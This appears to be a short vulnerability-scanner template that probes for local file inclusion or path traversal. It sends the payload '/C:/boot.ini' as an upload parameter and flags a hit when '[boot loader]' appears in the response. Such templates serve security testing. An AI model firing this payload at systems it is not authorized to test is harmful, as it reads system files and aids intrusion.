id: lfi6-1345
name: 'Traversal in upload'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via upload'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      upload:
        - '/C:/boot.ini'
    matchers:
      - type: word
        part: body
        words:
          - '[boot loader]'
